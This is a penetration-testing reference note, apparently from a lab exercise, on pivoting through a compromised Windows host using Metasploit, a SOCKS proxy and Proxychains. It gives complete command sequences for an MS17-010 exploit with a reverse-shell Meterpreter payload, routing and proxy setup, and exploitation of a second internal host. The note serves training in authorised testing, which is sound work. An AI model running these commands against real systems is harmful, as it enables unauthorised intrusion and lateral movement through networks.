
# üîê Pivoting, SOCKS Proxy, and Proxychains in Penetration Testing

This note is a **complete reference** for pivoting in penetration testing using Metasploit, SOCKS Proxy, and Proxychains.  
It includes **commands**, **concept explanations**, and a **step-by-step workflow**.  



## üöÄ Quick Reference Commands

### Metasploit

# Exploit Target1
msfconsole
search ms17-010
use exploit/windows/smb/ms17_010_psexec
set payload windows/x64/meterpreter/reverse_tcp
set RHOST 192.168.0.117
set SMBUSER forensic
set SMBPASS admin
set LHOST 192.168.0.139
set LPORT 6622
exploit

# Add Route for Pivoting
use post/multi/manage/autoroute
set SESSION 1
run
route

# Start SOCKS Proxy
use auxiliary/server/socks_proxy
run
jobs


### Proxychains

# Edit config file
mousepad /etc/proxychains4.conf

# Example changes
dynamic_chain
# strict_chain
socks5 127.0.0.1 1080

# Use proxychains with tools
proxychains nmap -p 139,445 -sT -n -Pn 192.168.205.106
proxychains msfconsole


---

## üß© Concepts

### Pivoting

* **Definition**: Using a compromised machine as a bridge to reach other machines in a restricted/internal network.
* **Purpose**: Gain access to systems that are not directly reachable from the attacker‚Äôs machine.

---

### Routing Table in Metasploit

* The `autoroute` module adds a route through a Meterpreter session to an internal subnet.
* **Limitation**: This route is only available inside Metasploit. External tools like `nmap` cannot use it directly.
* **Why Important**: Required to inform Metasploit how to reach the internal network.

---

### SOCKS Proxy

* **Definition**: A generic proxy protocol (SOCKS5 in this case) that forwards network traffic through an intermediary host.
* **In Practice**:

  * Metasploit runs a SOCKS proxy on `127.0.0.1:1080`.
  * Any traffic sent to this proxy is routed via the compromised host (`Target1`) into the internal network.
* **Why Important**: Extends pivoting beyond Metasploit to all external tools.

---

### Proxychains

* **Definition**: A Linux tool that forces any program to send its network connections through one or more proxies.
* **In Practice**:

  * Configured to use the SOCKS proxy created by Metasploit.
  * Ensures that tools like `nmap`, `msfconsole`, or `sqlmap` can reach internal targets via the compromised host.
* **Why Important**: Enables pivoting for tools outside Metasploit.

---

### Strict Chain vs Dynamic Chain

* **Strict Chain**: All proxies must be used in the exact order listed. If one fails, the connection fails.
* **Dynamic Chain**: Proxies are used in order but skipped if unavailable. More flexible and reliable.
* **Dead Proxy**: A non-functional proxy (e.g., offline or blocked). Skipped automatically in dynamic mode.

---

## üñ•Ô∏è Network Setup

* **Attacker (Kali Linux)**

  * IP: `192.168.0.139`

* **Target1 (Windows 10 - Compromised Pivot)**

  * External: `192.168.0.117`
  * Internal: `192.168.205.105`

* **Target2 (Windows 10 - Internal Only)**

  * Internal: `192.168.205.106`

---

## üîç Full Walkthrough

### Step 1: Compromise Target1

```bash
msfconsole
search ms17-010
use exploit/windows/smb/ms17_010_psexec
set payload windows/x64/meterpreter/reverse_tcp
set RHOST 192.168.0.117
set SMBUSER forensic
set SMBPASS admin
set LHOST 192.168.0.139
set LPORT 6622
exploit
```

* Establishes a Meterpreter session on Target1.

---

### Step 2: Add Routing Table

```bash
use post/multi/manage/autoroute
set SESSION 1
run
route
```

* Adds a route for the internal network through Target1.
* Only usable inside Metasploit at this stage.

---

### Step 3: Start SOCKS Proxy

```bash
use auxiliary/server/socks_proxy
run
jobs
```

* Starts a SOCKS proxy on `127.0.0.1:1080`.
* Makes the internal route available for external tools.

---

### Step 4: Configure Proxychains

```bash
mousepad /etc/proxychains4.conf
```

Edit as follows:

```text
dynamic_chain
# strict_chain
socks5 127.0.0.1 1080
```

* Ensures Proxychains will use the Metasploit SOCKS proxy.

---

### Step 5: Scan and Exploit Target2

```bash
proxychains nmap -p 139,445 -sT -n -Pn 192.168.205.106
```

* Runs Nmap through Proxychains to scan Target2.

```bash
proxychains msfconsole
search ms17-010
use exploit/windows/smb/ms17_010_psexec
set PAYLOAD windows/x64/meterpreter/bind_tcp
set RHOST 192.168.205.106
set SMBUSER forensic
set SMBPASS admin
set LPORT 6644
exploit
```

* Exploits Target2 through the pivot.

---

## üìä Traffic Flow Diagram

```text
   [ Kali Linux ]
        |
        | Proxychains ‚Üí SOCKS5 (127.0.0.1:1080)
        |
   [ Target1 (Compromised Pivot) ]
        |
        | Internal network (192.168.205.0/24)
        |
   [ Target2 (Internal Only) ]
```

---

## ‚úÖ Summary

* **Pivoting**: Expands access from one compromised host to hidden internal hosts.
* **Routing Table**: Provides Metasploit-only pivoting.
* **SOCKS Proxy**: Extends pivoting to external tools.
* **Proxychains**: Forces applications to use the SOCKS proxy.
* **Strict vs Dynamic Chain**: Proxychains modes for handling multiple proxies.
* **Dead Proxy**: A non-functional proxy skipped in dynamic mode.

üëâ Workflow:

1. Compromise Target1.
2. Add route in Metasploit.
3. Start SOCKS proxy.
4. Configure Proxychains.
5. Scan and exploit Target2 with any tool.

---
